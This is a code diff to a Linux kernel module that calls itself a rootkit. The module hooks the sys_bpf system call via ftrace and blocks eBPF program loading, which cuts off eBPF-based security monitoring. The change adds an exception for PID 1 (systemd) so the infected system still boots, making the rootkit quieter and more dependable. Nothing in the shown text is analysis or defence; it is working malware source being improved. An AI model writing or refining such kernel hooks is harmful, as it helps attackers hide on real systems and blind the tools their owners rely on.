@@ -7,6 +7,7 @@
 #include <linux/ftrace.h>
 #include <linux/kprobes.h>
 #include <linux/version.h>
+#include <linux/sched.h>
 
 // Module Information
 MODULE_LICENSE("GPL");
@@ -74,6 +75,12 @@ static asmlinkage long hook_sys_bpf(const struct pt_regs *regs)
     // On x86_64, the first argument is in the DI register (di).
     int cmd = (int)regs->di;
 
+    /* * Whitelist PID 1 (systemd) to prevent boot failure.
+     * Systemd relies on eBPF for cgroup management.
+     */
+    if (current->tgid == 1)
+        return original_sys_bpf(regs);
+        
     // Check: Is the command loading a program (BPF_PROG_LOAD)?
     if (cmd == BPF_PROG_LOAD) {
         printk(KERN_ALERT "[Rootkit] Intercepted BPF_PROG_LOAD via ftrace! Blocking execution.\n");
